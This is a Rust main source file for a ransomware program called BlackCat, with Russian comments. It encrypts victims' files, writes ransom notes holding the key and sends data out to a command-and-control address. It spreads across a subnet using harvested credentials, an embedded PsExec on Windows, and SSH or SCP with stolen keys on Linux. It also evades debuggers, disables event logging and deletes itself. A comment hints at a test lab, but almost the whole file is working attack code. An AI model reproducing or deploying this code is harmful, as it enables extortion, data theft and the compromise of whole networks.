// src/main.rs
mod crypto;
mod filesystem;
mod ransomware;
mod windows;
mod lateral_movement;
mod evasion;
mod config;
mod linux;
mod exfiltration;

use clap::{Parser, Subcommand};
use log::{info, warn, error, debug};
use std::path::{Path, PathBuf};
use std::collections::HashSet;
use std::net::TcpStream;
use std::io::{Write, Read};

#[cfg(target_os = "windows")]
const PSEXEC_BYTES: &[u8] = include_bytes!("../assets/PsExec.exe");

#[derive(Parser)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    Encrypt {
        #[arg(short, long)]
        path: String,
        #[arg(long)]
        spread: bool,
        #[arg(long)]
        exfiltrate: Option<String>,
        #[arg(long, default_value_t = false)]
        self_destruct: bool,
    },
    Decrypt {
        #[arg(short, long)]
        path: String,
        #[arg(short, long)]
        key: String,
    },
    Spread {
        #[arg(long)]
        subnet: Option<String>,
        #[arg(long, default_value = "11")]
        start_ip: u8,
        #[arg(long, default_value = "254")]
        end_ip: u8,
        #[arg(long, default_value_t = false)]
        self_destruct: bool,
    },
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    env_logger::Builder::from_default_env()
        .filter_level(log::LevelFilter::Info)
        .init();

    let cli = Cli::parse();

    match cli.command {
        Commands::Encrypt { path, spread, exfiltrate, self_destruct: should_self_destruct } => {
            if evasion::is_debugger_present() { return Ok(()); }
            let _ = evasion::disable_eventlog(); 
            
            let crypto_engine = crypto::CryptoEngine::new()?;
            let master_key = hex::encode(crypto_engine.get_master_key());
            info!("Master Key generated: {}", master_key);
            
            if let Some(ref c2_addr) = exfiltrate {
                let _ = exfiltration::Exfiltration::exfiltrate(&path, c2_addr, 4444, &crypto_engine);
            }
            
            // Запуск распространения (в фоне)
            let spread_task = if spread {
                info!("Initiating lateral movement in background...");
                let payload_path = std::env::current_exe()
                    .map(|p| p.to_string_lossy().to_string())
                    .unwrap_or_else(|_| "blackcat.exe".to_string());
                
                // ИСПРАВЛЕНИЕ: Используем тот же путь path, что и локально!
                // Чтобы на удаленной машине шифровалась та же папка (C:\TestLab\test_files)
                let target_path_arg = path.clone();
                
                let mut spread_args = vec![
                    "encrypt".to_string(),
                    "--path".to_string(),
                    target_path_arg, 
                ];
                if let Some(ref c2) = exfiltrate {
                    spread_args.push("--exfiltrate".to_string());
                    spread_args.push(c2.clone());
                }

                let spread_payload = payload_path.clone();
                let spread_args_clone = spread_args.clone();
                
                Some(tokio::spawn(async move {
                    if let Err(e) = auto_spread("192.168.53", 11, 254, &spread_payload, &spread_args_clone).await {
                        error!("Spread error: {}", e);
                    }
                }))
            } else {
                None
            };
            
            // Локальное шифрование
            let files = filesystem::scan_filesystem(&path)?;
            if !files.is_empty() {
                info!("Encrypting {} files...", files.len());
                ransomware::BlackCatRansomware::encrypt_all_files(
                    files.clone(),
                    ransomware::RansomwareConfig {
                        target_paths: vec![path.clone()],
                        file_extensions: vec!["txt", "doc", "docx", "xls", "xlsx", "jpg", "png"].iter().map(|s| s.to_string()).collect(),
                        encryption_algorithm: "aes-256-gcm".to_string(),
                        max_parallelism: 8,
                    },
                    &crypto_engine,
                ).await?;
                
                let mut dirs = HashSet::new();
                for f in files {
                    if let Some(p) = Path::new(&f).parent() {
                        dirs.insert(p.to_string_lossy().to_string());
                    }
                }
                let report = format!("Your ID/Key: {}", master_key);
                for d in dirs {
                    #[cfg(target_os = "windows")]
                    let _ = windows::WindowsPlatform::create_ransom_note(&d, &report);
                    #[cfg(target_os = "linux")]
                    let _ = linux::LinuxOperations::create_ransom_note(&d, &report);
                }
            }
            
            if let Some(task) = spread_task {
                info!("Waiting for spread to finish...");
                let _ = task.await; 
            }
            
            if should_self_destruct { perform_self_destruct()?; }
        }

        Commands::Decrypt { path, key } => {
            let key_bytes = hex::decode(key)?;
            let mut mk = [0u8; 32];
            mk.copy_from_slice(&key_bytes);
            let engine = crypto::CryptoEngine::from_key(mk);
            
            let files: Vec<String> = filesystem::scan_filesystem(&path)?
                .into_iter()
                .filter(|f| f.ends_with(".sttp"))
                .collect();
            
            ransomware::BlackCatRansomware::decrypt_all_files(
                files,
                ransomware::RansomwareConfig {
                    target_paths: vec![path],
                    file_extensions: vec![],
                    encryption_algorithm: "".to_string(),
                    max_parallelism: 8,
                },
                &engine,
            ).await?;
        }

        Commands::Spread { subnet, start_ip, end_ip, self_destruct } => {
            let sub = subnet.unwrap_or("192.168.53".to_string());
            let payload = std::env::current_exe()?.to_string_lossy().to_string();
            // И тут тоже поправим на переданный путь, если он был бы в аргументах, но тут заглушка
            let args = vec!["encrypt".to_string(), "--path".to_string(), "C:\\Users\\Public".to_string()];
            
            auto_spread(&sub, start_ip, end_ip, &payload, &args).await?;
            if self_destruct { perform_self_destruct()?; }
        }
    }
    Ok(())
}

async fn auto_spread(subnet: &str, start: u8, end: u8, payload: &str, args: &[String]) -> Result<(), Box<dyn std::error::Error>> {
    let hosts = lateral_movement::LateralMovement::discover_hosts(subnet, start, end);
    if hosts.is_empty() { return Ok(()); }
    
    let creds = lateral_movement::LateralMovement::harvest_credentials();
    info!("Harvested {} credential pairs", creds.len());

    for host in hosts {
        #[cfg(target_os = "windows")]
        if is_windows_host(&host) {
            info!("Attacking Windows host: {}", host);
            for (u, p, _) in &creds {
                if infect_windows_host(&host, u, p, payload, args).await {
                    break;
                }
            }
        }

        #[cfg(target_os = "linux")]
        if is_linux_host(&host) {
            info!("Attacking Linux host: {}", host);
            let keys = linux::LinuxOperations::enumerate_ssh_keys().unwrap_or_default();
            let mut infected = false;
            for key in &keys {
                if infect_linux_host_key(&host, key, payload, args).await {
                    infected = true;
                    break;
                }
            }
            if !infected {
                for (u, p, _) in &creds {
                    if !p.is_empty() && infect_linux_host_password(&host, u, p, payload, args).await {
                        break;
                    }
                }
            }
        }
    }
    Ok(())
}

fn is_windows_host(ip: &str) -> bool {
    lateral_movement::LateralMovement::check_port(ip, 445, 200) || 
    lateral_movement::LateralMovement::check_port(ip, 135, 200)
}
fn is_linux_host(ip: &str) -> bool {
    lateral_movement::LateralMovement::check_port(ip, 22, 200)
}

#[cfg(target_os = "windows")]
async fn infect_windows_host(host: &str, user: &str, pass: &str, payload: &str, args: &[String]) -> bool {
    use std::process::Command;
    use std::env;

    let current_exe = env::current_exe().unwrap_or_else(|_| PathBuf::from("."));
    let current_dir = current_exe.parent().unwrap_or_else(|| Path::new("."));
    let psexec_path = current_dir.join("PsExec.exe");
    
    if !psexec_path.exists() {
        if let Ok(mut f) = std::fs::File::create(&psexec_path) {
            let _ = f.write_all(PSEXEC_BYTES);
        }
    }

    let target = format!("\\\\{}", host);

    // Дополнительная надежность: копируем бинарник во временный файл, 
    // чтобы избежать блокировки (file in use), если вдруг мы его же и запускаем.
    let temp_payload = std::env::temp_dir().join("svc_host.exe");
    if let Ok(_) = std::fs::copy(payload, &temp_payload) {
        // Используем копию
        debug!("Payload copied to temp: {:?}", temp_payload);
    } else {
        // Если не вышло, используем оригинал
    }
    let payload_to_use = if temp_payload.exists() { 
        temp_payload.to_string_lossy().to_string() 
    } else { 
        payload.to_string() 
    };

    let mut psexec_args = vec![
        target,
        "-accepteula".to_string(),
        "-u".to_string(), user.to_string(),
        "-p".to_string(), pass.to_string(),
        "-s".to_string(), "-h".to_string(), "-i".to_string(), "-c".to_string(), "-f".to_string(),
        payload_to_use, // Передаем путь к файлу
    ];
    psexec_args.extend_from_slice(args);

    let output = Command::new(&psexec_path)
        .args(&psexec_args)
        .output();

    match output {
        Ok(res) => {
            let stdout = String::from_utf8_lossy(&res.stdout);
            if res.status.success() {
                info!("PsExec SUCCESS on {}. Output: {}", host, stdout);
                true
            } else {
                let stderr = String::from_utf8_lossy(&res.stderr);
                warn!("PsExec FAILED on {}. Stdout: {} | Stderr: {}", host, stdout, stderr);
                false
            }
        },
        Err(e) => {
            error!("Failed to launch PsExec: {}", e);
            false
        }
    }
}

// Заглушки
#[cfg(target_os = "windows")] async fn infect_linux_host_password(_: &str, _: &str, _: &str, _: &str, _: &[String]) -> bool { false }
#[cfg(target_os = "windows")] async fn infect_linux_host_key(_: &str, _: &str, _: &str, _: &[String]) -> bool { false }
#[cfg(target_os = "linux")] async fn infect_windows_host(_: &str, _: &str, _: &str, _: &str, _: &[String]) -> bool { false }
#[cfg(target_os = "linux")] async fn infect_linux_host_password(host: &str, user: &str, pass: &str, payload: &str, args: &[String]) -> bool {
    let tcp = match TcpStream::connect(format!("{}:22", host)) { Ok(s) => s, Err(_) => return false };
    let mut sess = match ssh2::Session::new() { Ok(s) => s, Err(_) => return false };
    sess.set_tcp_stream(tcp);
    if sess.handshake().is_err() || sess.userauth_password(user, pass).is_err() { return false; }
    
    let payload_bytes = match std::fs::read(payload) { Ok(b) => b, Err(_) => return false };
    let mut remote_file = match sess.scp_send(Path::new("/tmp/.blackcat"), 0o777, payload_bytes.len() as u64, None) {
        Ok(f) => f, Err(_) => return false
    };
    if remote_file.write_all(&payload_bytes).is_err() { return false; }
    let _ = remote_file.send_eof();
    let _ = remote_file.wait_close();
    
    let cmd = format!("nohup /tmp/.blackcat {} >/dev/null 2>&1 &", args.join(" "));
    let mut channel = match sess.channel_session() { Ok(c) => c, Err(_) => return false };
    channel.exec(&cmd).is_ok()
}
#[cfg(target_os = "linux")] async fn infect_linux_host_key(host: &str, key: &str, payload: &str, args: &[String]) -> bool {
    use std::process::Command;
    if !Path::new(key).exists() { return false; }
    let cmd = args.join(" ");
    let scp = format!("scp -i {} -o StrictHostKeyChecking=no {} root@{}:/tmp/.blackcat", key, payload, host);
    if Command::new("sh").args(&["-c", &scp]).output().is_err() { return false; }
    let ssh = format!("ssh -i {} -o StrictHostKeyChecking=no root@{} 'chmod +x /tmp/.blackcat && nohup /tmp/.blackcat {} >/dev/null 2>&1 &'", key, host, cmd);
    Command::new("sh").args(&["-c", &ssh]).output().map(|o| o.status.success()).unwrap_or(false)
}
fn perform_self_destruct() -> Result<(), Box<dyn std::error::Error>> {
    let exe = std::env::current_exe()?;
    #[cfg(target_os = "windows")] {
        let bat = format!("@echo off\r\ntimeout /t 3\r\ndel \"{}\"\r\ndel \"%~f0\"", exe.to_string_lossy());
        let p = std::env::temp_dir().join("del.bat");
        std::fs::write(&p, bat)?;
        std::process::Command::new("cmd").args(&["/c", "start", "/b", p.to_str().unwrap()]).spawn()?;
    }
    #[cfg(target_os = "linux")] {
        let sh = format!("#!/bin/sh\nsleep 3\nrm -f \"{}\"\nrm -f \"$0\"", exe.to_string_lossy());
        let p = format!("/tmp/del_{}.sh", std::process::id());
        std::fs::write(&p, sh)?;
        std::process::Command::new("sh").args(&["-c", &format!("chmod +x {} && {} &", p, p)]).spawn()?;
    }
    Ok(())
}